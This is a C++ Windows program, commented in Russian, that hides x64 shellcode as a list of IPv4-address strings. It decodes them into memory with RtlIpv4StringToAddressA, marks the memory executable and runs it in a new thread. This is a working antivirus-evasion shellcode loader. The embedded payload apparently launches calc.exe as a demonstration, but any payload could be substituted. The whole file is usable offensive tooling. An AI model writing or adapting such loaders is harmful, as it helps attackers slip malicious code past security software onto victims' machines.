#include <Windows.h>
#include <iostream>
#include <Ip2string.h>

#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* IPv4Shell[] = {
    "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192",
    "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
    "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68",
    "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
    "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255",
    "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0"
};
#define ElementsNumber 69
#define SizeOfShellcode 276

BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {
    PCSTR Terminator = NULL;
    PVOID LpBaseAddress2 = NULL;
    NTSTATUS STATUS;
    int i = 0;
    for (int j = 0; j < ElementsNumber; j++) {
        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);
        STATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);
        if (STATUS != 0) {
            printf("[!] Error decoding at address: %p\n", (PVOID)((ULONG_PTR)LpBaseAddress + i));
            return FALSE;
        }
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV4[j], STATUS);
            return FALSE;
        }
        else {
            i = i + 4;
        }
    }
    return TRUE;
}


// Потоковая функция для запуска шеллкода
DWORD WINAPI ThreadProc(LPVOID lpParam) {
    // Преобразуем переданный параметр (адрес шеллкода) в указатель на функцию
    void (*func)() = (void(*)())lpParam;
    func();  // Запускаем шеллкод
    return 0;
}


int main(int argc, char* argv[]) {
    printf("[i] Decoding IPv4 Obfuscated Shellcode...\n");
    // Выделяем память под шеллкод
    PVOID pShellcodeAddress = VirtualAlloc(NULL, SizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Memory Allocated At: 0x%p\n", pShellcodeAddress);

    if (!DecodeIPv4Fuscation(IPv4Shell, pShellcodeAddress)) {
        printf("[!] Failed To Decode Shellcode\n");
        return -1;
    }
    printf("[+] Shellcode Successfully Decoded\n");

    printf("[i] Shellcode memory dump:\n");
    for (int k = 0; k < SizeOfShellcode; k++) {
        printf("%02X ", ((unsigned char*)pShellcodeAddress)[k]);
        if ((k + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // Изменяем права памяти на EXECUTE_READ
    DWORD dwOldProtection = 0;
    if (!VirtualProtect(pShellcodeAddress, SizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Memory Protection Changed To EXECUTE_READ\n");

    // Запускаем шеллкод
    HANDLE hThread = CreateThread(NULL, 0, ThreadProc, pShellcodeAddress, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
        return -1;
    }

    // Ожидаем завершения потока
    DWORD dwWaitResult = WaitForSingleObject(hThread, INFINITE);
    if (dwWaitResult == WAIT_FAILED) {
        printf("[!] WaitForSingleObject Failed With Error: %d\n", GetLastError());
    }
    else {
        printf("[+] Thread Execution Completed\n");
    }

    printf("[+] Shellcode Executed Successfully!\n");

    // Закрываем дескриптор потока
    CloseHandle(hThread);

    // Освобождаем память
    VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);

    return 0;
}